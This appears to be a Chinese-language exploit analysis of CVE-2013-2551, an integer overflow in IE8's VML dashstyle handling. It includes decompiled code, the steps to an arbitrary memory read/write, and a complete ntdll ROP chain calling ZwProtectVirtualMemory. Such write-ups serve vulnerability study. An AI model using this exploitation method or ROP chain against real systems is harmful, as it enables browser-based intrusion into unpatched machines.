{"title": "CVE-2013-2551\u5206\u6790", "tags": "Exploit IntegerOverflow", "content": "## 0x00.\u73af\u5883\r\n\u7cfb\u7edf: WIN7\r\n\r\n\u6d4f\u89c8\u5668: IE 8.0.7600.16385\r\n\r\n## 0x01.\u6210\u56e0\r\n\r\n\u8bbe\u7f6edashstyle.array.length\u503c\u65f6\uff0c\u4f1a\u9020\u6210\u6574\u6570\u6ea2\u51fa\uff0c\u5bfc\u81f4\u6570\u7ec4\u8d8a\u754c\u8bbf\u95ee\r\n\r\n\r\nVML\u4ecb\u7ecd\u548cCVE\u5206\u6790\uff0c\u8fd9\u91cc\u6709\u7bc7\u597d\u6587\u7ae0\r\n[\u300aCVE-2013-2551\u6f0f\u6d1e\u6210\u56e0\u4e0e\u5229\u7528\u5206\u6790\u300b](http://www.cnblogs.com/Danny-Wei/archive/2014/06/03/3766432.html)\r\n\r\n## 0x02.\u8981\u70b9\r\n\r\n##### 1.dashstyle\u6570\u7ec4\u5982\u4f55\u5206\u914d\u7684\uff1f\r\n\u521d\u6b21\u7528MsoFAllocMemCore\u5206\u914d0x10\u5b57\u8282\uff0c\u540e\u7eed\u7528MsoFResizePx\u6bcf\u6b21\u9012\u589e0x10\u91cd\u65b0\u5206\u914d\uff0c\u5177\u4f53\u53ef\u4ee5\u81ea\u5df1\u5206\u6790ParseDashStyle\u51fd\u6570\r\n\r\n##### 2.POC\u4e0adashstyle\u6570\u7ec4\u8d4b\u503c\u6709\u542b\u4e49\u5417\uff1f\r\n\u53ea\u8981\u4e0d\u662f\u51680\u5c31OK\uff0c\u51680\u5219\u4f1aFREE\u6389dashstyle\u6570\u7ec4\uff0c\u53c2\u89c1SetArrayProp\u51fd\u6570\r\n```c\r\nvoid __stdcall SetArrayProp(int a1, int a2, int a3)\r\n{\r\n  int v3; // edi@1\r\n  int v4; // esi@2\r\n  int v5; // eax@5\r\n  int v6; // ST0C_4@5\r\n  int v7; // eax@5\r\n  int *v8; // eax@5\r\n  int v9; // eax@5\r\n\r\n  v3 = a1;\r\n  if ( a1 )\r\n  {\r\n    v4 = a3;\r\n    if ( a3 )\r\n    {\r\n      if ( a2 == 463\r\n        && (v5 = *a3,\r\n            v6 = a3,\r\n            BYTE3(a1) = 0,\r\n            v7 = (*(v5 + 44))(),\r\n            v8 = (*(*v4 + 32))(v4, 0, v7),\r\n            v9 = GELEnumFromDashLengths(v8, v6, (&a1 + 3)),\r\n            SetPropA(v3, 462, v9),\r\n            BYTE3(a1))\t\t\t\t\t\t\t//\u51680\u7684\u8bdd\u4e0a\u9762GELEnumFromDashLengths\u4f1a\u7f6ea1\u5bfc\u81f4\u6267\u884c\u4e0b\u9762\u7684Free\r\n        || !SetPropA(v3, a2, v4) )\r\n        (*(*v4 + 4))(v4);                       // Free\r\n    }\r\n    else\r\n    {\r\n      SetPropA(a1, a2, a3);\r\n    }\r\n  }\r\n}\r\n```\r\n\r\n##### 3.\u5982\u4f55\u5b9e\u73b0\u5229\u7528\uff1f\r\n_vgRuntimeStyle\u5bf9\u8c61\u9996\u6b21\u8c03\u7528rotation\u65b9\u6cd5\u65f6\uff0c\u4f1a\u7533\u8bf70xAC(\u5b9e\u9645\u5360\u75280xB0)\u7a7a\u95f4\uff0c\u800c\u5176\u5bf9\u8c610x58\u504f\u79fb\u5904\u53e6\u4e00\u4e2a\u5c5e\u6027marginLeft\u7684\u503c\u662f\u53ef\u63a7\u7684\uff0c\u4ece\u800c\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\uff0c\u83b7\u5f97ntdll.dll\u57fa\u5740\r\n\r\n##### 4.\u5982\u4f55\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\uff1f\r\nCOAShape\u7c7b\u65b9\u6cd5_anchorRect\u4f1a\u7533\u8bf70x10\u5b57\u8282\uff0c\u5f53\u56de\u6536\u5185\u5b58\u65f6\u5019\uff0c\u4f1a\u8c03\u7528\u5176\u865a\u51fd\u6570\u8868\u7b2c\u4e09\u4e2a\u51fd\u6570\r\n\r\n##### 5.ROP\u4e2d\u4e3a\u4ec0\u4e48\u8981\u5207\u6362\u4e24\u6b21\u6808\uff1f\r\n\u7b2c\u4e00\u6b21\u83b7\u5f97\u63a7\u5236\u6743\u9700\u8981\u5728\u4e00\u6b21GADGET\u4e2d\u5b9e\u73b0\u6808\u5207\u6362\uff0c\u7531\u4e8e\u6ca1\u6709XCHG ECX,ESP\u8fd9\u79cdGADGET\uff0c\u6240\u4ee5\u9700\u8981\u5207\u63622\u6b21\u6808\r\n\r\n##### 6.ROP\u94fe\r\n\u7531\u4e8e\u4e0d\u80fd\u51fa\u73b00x0000\uff0c\u6240\u4ee5\u5229\u7528AND DWORD PTR [EAX]\uff0c0FFFFFFF\u5b9e\u73b0\u7279\u6b8a\u503c\u7684\u9700\u8981\r\n```c\r\n\t0x77a57213 :  # XCHG EAX,ESP # POP ESI # POP EDI # LEA EAX,DWORD PTR DS:[EDX-1] # POP EBX # RETN\r\n\t0x77ab1f9c :  # PUSH ESP # MOV EAX,EDI # POP EDI # POP ESI # POP EBP # RETN 0x04\r\n\t0x80000400 :  # edi -> NumberOfBytesToProtect\r\n\t0x90909090\r\n\t0x77a3aea5 :  # XCHG EAX,EDI # RETN edi -> eax\r\n\t0x90909090\r\n\t0x77a295d2 :  # AND DWORD PTR [EAX]\uff0c0FFFFFFF # POP EBP # RETN 0x08\r\n\t0x90909090\t\r\n\t0x77abe9c2 :  # XCHG EAX,EBP # RETN eax -> ebp\r\n\t0x90909090\r\n\t0x90909090\r\n\t0x77a19b9c :  # PUSH EBP # ADD EAX,5E5F0008 # POP EBX # POP EBP # RETN 0x04 ebp -> ebx\r\n\t0x90909090\r\n\t0x77ab1f9c :  # PUSH ESP # MOV EAX,EDI # POP EDI # POP ESI # POP EBP # RETN 0x04\r\n\t0x90909090\r\n\t0x80000040 :  # -> esi\r\n\t0x90909090\r\n\t0x77a8dff4 :  # XCHG EAX,ESI # RETN esi - > eax\r\n\t0x90909090\r\n\t0x77acad6e :  # AND EAX,5DFFFFFF # RETN 0x04\r\n\t0x77a19b60 :  # XCHG EAX,EDX # ADD AL0 # RETN  eax -> edx\r\n\t0x90909090\t\r\n\t0x77ab1f9c :  # PUSH ESP # MOV EAX,EDI # POP EDI # POP ESI # POP EBP # RETN 0x04\r\n\t0x90909090\r\n\t0x90909090\r\n\t0x77a3aea5 :  # XCHG EAX,EDI # RETN  edi -> eax\r\n\t0x90909090\t\r\n\t0x77a19c14 :  # XCHG EAX,ECX # ADD AL0 # POP ESI # RETN eax -> ecx\r\n\t0x90909090\t\t\r\n\t0x77ab1f9c :  # PUSH ESP # MOV EAX,EDI # POP EDI # POP ESI # POP EBP # RETN 0x04\t\r\n\t0x77a55a60,\t  # ZwProtectVirtualMemory  -> esi  esp!!!!!!!\r\n\t0xffffffff :  # -1 -> ebp\r\n\t0x77a7a59a :  # XCHG EDI,ESI # DEC ECX # RETN 0x04  esi <-> edi\r\n\t0x90909090\r\n\t0x77a8dff4 :  # XCHG EAX,ESI # RETN esi -> eax\t\r\n\t0x90909090\r\n\t0x77a67a72 :  # ADD EAX,20 # RETN\r\n\t0x77a67a72 :  # ADD EAX,20 # RETN\r\n\t0x77a8dff4 :  # XCHG EAX,ESI # RETN eax -> esi\t\r\n\t0x77a9608b :  # XOR EAX,EAX # INC EAX # RETN\r\n\t0x77a1e083 :  # PUSHAD # JP NTDLL!RTLCRC32TABLE+0X2B3 (77A1E08B) # INC ECX # RETN\r\n\t0x90909090\r\n\t0x90909090\r\n\t0x90909090\r\n\t0x90909090\r\n\t0x90909090\r\n\t0xcc\r\n\t\r\n```"}